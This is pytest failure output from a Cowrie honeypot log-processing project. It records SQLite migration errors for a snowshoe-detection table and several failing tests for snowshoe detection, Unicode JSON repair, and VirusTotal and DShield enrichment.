2025-10-18 17:41:32,113:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:41:32,113:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:41:32,114:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:41:32,114:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:41:32,117:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:41:32,117:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:41:32,119:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:41:32,119:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:41:32,120:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:41:32,120:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:41:32,121:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:41:32,121:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:41:32,122:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:41:32,122:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:41:32,126:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:41:32,126:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:41:32,126:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:41:32,126:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:41:32,128:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:32,128:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:32,128:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:32,128:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:32,129:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:32,129:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:32,131:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:32,131:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:32,132:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:32,132:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:32,132:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 17:41:32,132:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log call -------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
_____________ TestSnowshoeIntegration.test_mixed_traffic_detection _____________

self = <test_snowshoe_integration.TestSnowshoeIntegration object at 0x7756b441c050>
mixed_traffic_sessions = [<Mock spec='SessionSummary' id='131214247172080'>, <Mock spec='SessionSummary' id='131214247173760'>, <Mock spec='Ses...240743840'>, <Mock spec='SessionSummary' id='131214240744176'>, <Mock spec='SessionSummary' id='131214240744512'>, ...]

    def test_mixed_traffic_detection(self, mixed_traffic_sessions: List[SessionSummary]) -> None:
        """Test detection with mixed snowshoe and normal traffic."""
        detector = SnowshoeDetector(
            single_attempt_threshold=3,
            sensitivity_threshold=0.7,  # Higher threshold for mixed traffic
            geographic_diversity_threshold=0.6,
        )
    
        result = detector.detect(mixed_traffic_sessions, window_hours=24)
    
        # Should detect snowshoe due to the high ratio of single-attempt IPs
        assert result["is_likely_snowshoe"] is True
        assert result["confidence_score"] > 0.5
    
        # Should identify the snowshoe portion
        assert len(result["single_attempt_ips"]) == 200  # Snowshoe IPs
        assert len(result["low_volume_ips"]) == 0  # Normal IPs have many sessions
>       assert result["geographic_spread"] > 0.6  # High diversity from snowshoe portion
E       assert 0.157 > 0.6

/home/speterson/cowrieprocessor/tests/integration/test_snowshoe_integration.py:187: AssertionError
----------------------------- Captured stdout call -----------------------------
2025-10-18 17:41:35,097:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:__init__:Initialized SnowshoeDetector with thresholds: single_attempt=3, time_cluster_eps=0.10, min_cluster_size=5, geo_diversity=0.60, sensitivity=0.70
2025-10-18 17:41:35,097:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:__init__:Initialized SnowshoeDetector with thresholds: single_attempt=3, time_cluster_eps=0.10, min_cluster_size=5, geo_diversity=0.60, sensitivity=0.70
2025-10-18 17:41:35,098:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Starting snowshoe detection analysis on 400 sessions
2025-10-18 17:41:35,098:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Starting snowshoe detection analysis on 400 sessions
2025-10-18 17:41:35,122:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Snowshoe detection complete: confidence=0.702, snowshoe=True, single_attempt_ips=200, coordinated_timing=True
2025-10-18 17:41:35,122:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Snowshoe detection complete: confidence=0.702, snowshoe=True, single_attempt_ips=200, coordinated_timing=True
------------------------------ Captured log call -------------------------------
INFO     cowrieprocessor.threat_detection.snowshoe:snowshoe.py:59 Initialized SnowshoeDetector with thresholds: single_attempt=3, time_cluster_eps=0.10, min_cluster_size=5, geo_diversity=0.60, sensitivity=0.70
INFO     cowrieprocessor.threat_detection.snowshoe:snowshoe.py:91 Starting snowshoe detection analysis on 400 sessions
INFO     cowrieprocessor.threat_detection.snowshoe:snowshoe.py:145 Snowshoe detection complete: confidence=0.702, snowshoe=True, single_attempt_ips=200, coordinated_timing=True
__ TestUnicodeHandlingIntegration.test_dlq_processing_repairs_unicode_issues ___

self = <test_unicode_handling_integration.TestUnicodeHandlingIntegration object at 0x7756b43d3b10>

    def test_dlq_processing_repairs_unicode_issues(self) -> None:
        """Test that DLQ processing can repair JSON with Unicode control characters."""
        from cowrieprocessor.loader.dlq_processor import JSONRepairStrategies
    
        # Malformed JSON with actual Unicode control characters (not escape sequences)
        malformed_json = '{"eventid": "cowrie.session.connect", "message": "hello\x00world\x16"}'
    
        # Apply repair strategies
        repaired = JSONRepairStrategies.repair_json(malformed_json)
    
        # Should be valid JSON
>       parsed = json.loads(repaired)

/home/speterson/cowrieprocessor/tests/integration/test_unicode_handling_integration.py:58: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/json/__init__.py:346: in loads
    return _default_decoder.decode(s)
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/json/decoder.py:345: in decode
    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = <json.decoder.JSONDecoder object at 0x7756e9dfc6e0>
s = '{"eventid": "cowrie.session.connect\\" \\"essage": "helloworld"}', idx = 0

    def raw_decode(self, s, idx=0):
        """Decode a JSON document from ``s`` (a ``str`` beginning with
        a JSON document) and return a 2-tuple of the Python
        representation and the index in ``s`` where the document ended.
    
        This can be used to decode a JSON document from a string that may
        have extraneous data at the end.
    
        """
        try:
>           obj, end = self.scan_once(s, idx)
E           json.decoder.JSONDecodeError: Expecting ',' delimiter: line 1 column 48 (char 47)

/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/json/decoder.py:361: JSONDecodeError
----------------------------- Captured stdout call -----------------------------
2025-10-18 17:41:52,996:DEBUG:cowrieprocessor.utils.unicode_sanitizer:unicode_sanitizer.py:sanitize_unicode_string:Sanitized Unicode control characters: \u0000, \u0016
2025-10-18 17:41:52,996:DEBUG:cowrieprocessor.utils.unicode_sanitizer:unicode_sanitizer.py:sanitize_unicode_string:Sanitized Unicode control characters: \u0000, \u0016
------------------------------ Captured log call -------------------------------
DEBUG    cowrieprocessor.utils.unicode_sanitizer:unicode_sanitizer.py:66 Sanitized Unicode control characters: \u0000, \u0016
______ TestVirusTotalIntegration.test_enrichment_service_with_vt_handler _______

self = <test_virustotal_integration.TestVirusTotalIntegration object at 0x7756b43d3d90>
tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_enrichment_service_with_v0')

    def test_enrichment_service_with_vt_handler(self, tmp_path: Path) -> None:
        """Test that EnrichmentService properly integrates with VirusTotalHandler."""
        cache_dir = tmp_path / "cache"
        cache_dir.mkdir()
    
        # Mock VirusTotal response (not used in this test)
    
        with patch('cowrieprocessor.enrichment.virustotal_handler.vt.Client') as mock_client_class:
            # Mock the client and file object
            mock_file_obj = Mock()
            mock_file_obj.id = "test-file-id"
            mock_file_obj.type = "file"
            mock_file_obj.last_analysis_stats = {"malicious": 5, "harmless": 10, "suspicious": 2, "undetected": 20}
            mock_file_obj.last_analysis_results = {}
            mock_file_obj.first_submission_date = 1234567890
            mock_file_obj.last_submission_date = 1234567890
            mock_file_obj.md5 = "test-md5"
            mock_file_obj.sha1 = "test-sha1"
            mock_file_obj.sha256 = "test-sha256"
            mock_file_obj.size = 1024
            mock_file_obj.type_description = "PE32"
            mock_file_obj.names = ["test.exe"]
            mock_file_obj.tags = ["trojan"]
            mock_file_obj.reputation = 50
            mock_file_obj.total_votes = 10
            mock_file_obj.meaningful_name = "test.exe"
    
            mock_client = Mock()
            mock_client.get_object.return_value = mock_file_obj
            mock_client_class.return_value = mock_client
    
            # Create enrichment service with VirusTotal handler
            service = EnrichmentService(
                cache_dir=cache_dir,
                vt_api="test-api-key",
                dshield_email=None,
                urlhaus_api=None,
                spur_api=None,
                enable_vt_quota_management=True,
            )
    
            # Test file enrichment
            result = service.enrich_file("test-hash", "test.exe")
    
            assert result is not None
            assert "file_hash" in result
            assert "filename" in result
            assert "enrichment" in result
    
            enrichment = result["enrichment"]
            assert "virustotal" in enrichment
    
            vt_data = enrichment["virustotal"]
>           assert vt_data is not None
E           assert None is not None

/home/speterson/cowrieprocessor/tests/integration/test_virustotal_integration.py:70: AssertionError
----------------------------- Captured stdout call -----------------------------
2025-10-18 17:41:54,340:WARNING:cowrieprocessor.enrichment.virustotal_handler:virustotal_handler.py:_fetch_file_info:VirusTotal request failed for test-hash: unsupported operand type(s) for /: 'Mock' and 'Mock'
2025-10-18 17:41:54,340:WARNING:cowrieprocessor.enrichment.virustotal_handler:virustotal_handler.py:_fetch_file_info:VirusTotal request failed for test-hash: unsupported operand type(s) for /: 'Mock' and 'Mock'
2025-10-18 17:41:54,342:ERROR:cowrieprocessor.enrichment.virustotal_handler:virustotal_handler.py:enrich_file:VirusTotal enrichment failed for test-hash: unsupported operand type(s) for /: 'Mock' and 'Mock'
2025-10-18 17:41:54,342:ERROR:cowrieprocessor.enrichment.virustotal_handler:virustotal_handler.py:enrich_file:VirusTotal enrichment failed for test-hash: unsupported operand type(s) for /: 'Mock' and 'Mock'
------------------------------ Captured log call -------------------------------
WARNING  cowrieprocessor.enrichment.virustotal_handler:virustotal_handler.py:215 VirusTotal request failed for test-hash: unsupported operand type(s) for /: 'Mock' and 'Mock'
ERROR    cowrieprocessor.enrichment.virustotal_handler:virustotal_handler.py:242 VirusTotal enrichment failed for test-hash: unsupported operand type(s) for /: 'Mock' and 'Mock'
__________ TestEnrichmentCachePerformance.test_cache_hit_performance ___________

self = <test_enrichment_performance.TestEnrichmentCachePerformance object at 0x7756b439c910>
tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_cache_hit_performance0')

    def test_cache_hit_performance(self, tmp_path) -> None:
        """Test cache hit performance for repeated lookups."""
        cache_dir = tmp_path / "cache"
        cache_dir.mkdir()
    
        from process_cowrie import dshield_query
    
        # Populate cache with test data
        test_ip = "192.168.1.100"
        # dshield_data = json.loads(get_dshield_response("datacenter"))
    
        # First call - should make API call
        start_time = time.time()
>       result1 = dshield_query(test_ip, cache_base=cache_dir)
E       TypeError: dshield_query() got an unexpected keyword argument 'cache_base'

/home/speterson/cowrieprocessor/tests/performance/test_enrichment_performance.py:41: TypeError
__________ TestEnrichmentCachePerformance.test_cache_miss_performance __________

self = <test_enrichment_performance.TestEnrichmentCachePerformance object at 0x7756b439ca50>
tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_cache_miss_performance0')

    def test_cache_miss_performance(self, tmp_path) -> None:
        """Test cache miss performance for new lookups."""
        cache_dir = tmp_path / "cache"
        cache_dir.mkdir()
    
        from process_cowrie import dshield_query
    
        # Mock the API call to measure performance
        with patch('process_cowrie.enrichment_dshield_query') as mock_dshield:
            mock_dshield.return_value = json.loads(get_dshield_response("datacenter"))
    
            # Time multiple cache misses
            test_ips = [f"192.168.1.{i}" for i in range(10)]
    
            start_time = time.time()
            for ip in test_ips:
>               dshield_query(ip, cache_base=cache_dir)
E               TypeError: dshield_query() got an unexpected keyword argument 'cache_base'

/home/speterson/cowrieprocessor/tests/performance/test_enrichment_performance.py:73: TypeError
___ TestEnrichmentCachePerformance.test_concurrent_cache_access_performance ____

self = <test_enrichment_performance.TestEnrichmentCachePerformance object at 0x7756b441dcd0>
tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_concurrent_cache_access_p0')

    def test_concurrent_cache_access_performance(self, tmp_path) -> None:
        """Test cache performance under concurrent access."""
        cache_dir = tmp_path / "cache"
        cache_dir.mkdir()
    
        from process_cowrie import dshield_query
    
        def worker(ip):
            """Worker function for concurrent cache access."""
            return dshield_query(ip, cache_base=cache_dir)
    
        # Mock API calls
        with patch('process_cowrie.enrichment_dshield_query') as mock_dshield:
            mock_dshield.return_value = json.loads(get_dshield_response("datacenter"))
    
            test_ips = [f"192.168.1.{i}" for i in range(20)]
    
            # Test concurrent access
            start_time = time.time()
            with ThreadPoolExecutor(max_workers=5) as executor:
>               results = list(executor.map(worker, test_ips))

/home/speterson/cowrieprocessor/tests/performance/test_enrichment_performance.py:100: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/concurrent/futures/_base.py:619: in result_iterator
    yield _result_or_cancel(fs.pop())
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/concurrent/futures/_base.py:317: in _result_or_cancel
    return fut.result(timeout)
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/concurrent/futures/_base.py:449: in result
    return self.__get_result()
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/concurrent/futures/_base.py:401: in __get_result
    raise self._exception
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/concurrent/futures/thread.py:59: in run
    result = self.fn(*self.args, **self.kwargs)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

ip = '192.168.1.0'

    def worker(ip):
        """Worker function for concurrent cache access."""
>       return dshield_query(ip, cache_base=cache_dir)
E       TypeError: dshield_query() got an unexpected keyword argument 'cache_base'

/home/speterson/cowrieprocessor/tests/performance/test_enrichment_performance.py:89: TypeError
__________ TestEnrichmentCachePerformance.test_cache_ttl_performance ___________

self = <test_enrichment_performance.TestEnrichmentCachePerformance object at 0x7756b441df30>
tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_cache_ttl_performance0')

    def test_cache_ttl_performance(self, tmp_path) -> None:
        """Test cache TTL expiration performance."""
        cache_dir = tmp_path / "cache"
        cache_dir.mkdir()
    
        from process_cowrie import dshield_query
    
        # Create cache entry
        test_ip = "192.168.1.100"
>       dshield_query(test_ip, cache_base=cache_dir)
E       TypeError: dshield_query() got an unexpected keyword argument 'cache_base'

/home/speterson/cowrieprocessor/tests/performance/test_enrichment_performance.py:117: TypeError
__________ TestEnrichmentTimeoutPerformance.test_timeout_enforcement ___________

self = <test_enrichment_performance.TestEnrichmentTimeoutPerformance object at 0x7756b439cb90>
tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_timeout_enforcement0')

    def test_timeout_enforcement(self, tmp_path) -> None:
        """Test that timeouts are properly enforced."""
        from process_cowrie import safe_read_uh_data
    
        def slow_api_call(*args, **kwargs):
            time.sleep(5)  # Longer than timeout
            return "completed"
    
        with patch('process_cowrie.with_timeout', side_effect=TimeoutError("Operation timed out")):
            start_time = time.time()
>           result = safe_read_uh_data("192.168.1.100", "test-key", timeout=1)
E           TypeError: safe_read_uh_data() got an unexpected keyword argument 'timeout'

/home/speterson/cowrieprocessor/tests/performance/test_enrichment_performance.py:150: TypeError
______ TestEnrichmentTimeoutPerformance.test_timeout_with_cache_fallback _______

self = <test_enrichment_performance.TestEnrichmentTimeoutPerformance object at 0x7756b439ccd0>
tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_timeout_with_cache_fallba0')

    def test_timeout_with_cache_fallback(self, tmp_path) -> None:
        """Test timeout handling with cache fallback."""
        cache_dir = tmp_path / "cache"
        cache_dir.mkdir()
    
        # Pre-populate cache
        cache_file = cache_dir / "uh_192.168.1.100"
        cache_file.write_text('{"cached": "data"}')
    
        from process_cowrie import safe_read_uh_data
    
        def slow_api_call(*args, **kwargs):
            time.sleep(5)  # Longer than timeout
            return "completed"
    
        with patch('process_cowrie.with_timeout', side_effect=TimeoutError("Operation timed out")):
>           result = safe_read_uh_data("192.168.1.100", "test-key", cache_base=cache_dir, timeout=1)
E           TypeError: safe_read_uh_data() got an unexpected keyword argument 'cache_base'

/home/speterson/cowrieprocessor/tests/performance/test_enrichment_performance.py:173: TypeError
_________ TestEnrichmentTimeoutPerformance.test_bulk_timeout_handling __________

self = <test_enrichment_performance.TestEnrichmentTimeoutPerformance object at 0x7756b441e060>
tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_bulk_timeout_handling0')

    def test_bulk_timeout_handling(self, tmp_path) -> None:
        """Test timeout handling in bulk operations."""
        from process_cowrie import safe_read_uh_data
    
        def slow_api_call(*args, **kwargs):
            time.sleep(5)  # Longer than timeout
            return "completed"
    
        with patch('process_cowrie.with_timeout', side_effect=TimeoutError("Operation timed out")):
            # Test multiple IPs with timeouts
            test_ips = [f"192.168.1.{i}" for i in range(10)]
    
            start_time = time.time()
            results = []
            for ip in test_ips:
>               result = safe_read_uh_data(ip, "test-key", timeout=1)
E               TypeError: safe_read_uh_data() got an unexpected keyword argument 'timeout'

/home/speterson/cowrieprocessor/tests/performance/test_enrichment_performance.py:193: TypeError
______ TestConcurrentEnrichmentPerformance.test_concurrent_ip_enrichment _______

self = <test_enrichment_performance.TestConcurrentEnrichmentPerformance object at 0x7756b439ce10>
tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_concurrent_ip_enrichment0')

    def test_concurrent_ip_enrichment(self, tmp_path) -> None:
        """Test concurrent IP enrichment across multiple services."""
        cache_dir = tmp_path / "cache"
        cache_dir.mkdir()
    
        from process_cowrie import dshield_query, read_spur_data
    
        def enrich_ip(ip):
            """Enrich a single IP with multiple services."""
            results = {}
    
            # DShield enrichment
            try:
                results["dshield"] = dshield_query(ip, cache_base=cache_dir)
            except Exception:
                results["dshield"] = {"ip": {"asname": "", "ascountry": ""}}
    
            # SPUR enrichment
            try:
                results["spur"] = read_spur_data(ip, "test-key", cache_base=cache_dir)
            except Exception:
                results["spur"] = [""] * 18
    
            return results
    
        # Mock API calls for performance testing
        with (
            patch('process_cowrie.enrichment_dshield_query') as mock_dshield,
            patch('process_cowrie.enrichment_read_spur_data') as mock_spur,
        ):
            mock_dshield.return_value = json.loads(get_dshield_response("datacenter"))
            mock_spur.return_value = json.loads(get_spur_response("datacenter"))
    
            # Test concurrent enrichment
            test_ips = [f"192.168.1.{i}" for i in range(50)]
    
            start_time = time.time()
            with ThreadPoolExecutor(max_workers=10) as executor:
                results = list(executor.map(enrich_ip, test_ips))
            end_time = time.time()
    
            total_time = end_time - start_time
    
            # Should complete in reasonable time
            assert total_time < 15.0  # Less than 15 seconds for 50 concurrent enrichments
            assert len(results) == 50
    
            # Verify all results have expected structure
            for result in results:
                assert "dshield" in result
                assert "spur" in result
>               assert result["dshield"]["ip"]["asname"] == "AMAZON-02"
E               AssertionError: assert '' == 'AMAZON-02'
E                 
E                 - AMAZON-02

/home/speterson/cowrieprocessor/tests/performance/test_enrichment_performance.py:256: AssertionError
_____ TestConcurrentEnrichmentPerformance.test_concurrent_file_enrichment ______

self = <test_enrichment_performance.TestConcurrentEnrichmentPerformance object at 0x7756b439cf50>
tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_concurrent_file_enrichmen0')

    def test_concurrent_file_enrichment(self, tmp_path) -> None:
        """Test concurrent file hash enrichment."""
        cache_dir = tmp_path / "cache"
        cache_dir.mkdir()
    
        from process_cowrie import vt_query
    
        def enrich_file(hash_value):
            """Enrich a single file hash."""
            try:
                vt_query(hash_value, cache_dir)
                return True
            except Exception:
                return False
    
        # Mock API calls
>       with patch('process_cowrie.enrichment_vt_query') as mock_vt:

/home/speterson/cowrieprocessor/tests/performance/test_enrichment_performance.py:275: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:1497: in __enter__
    original, local = self.get_original()
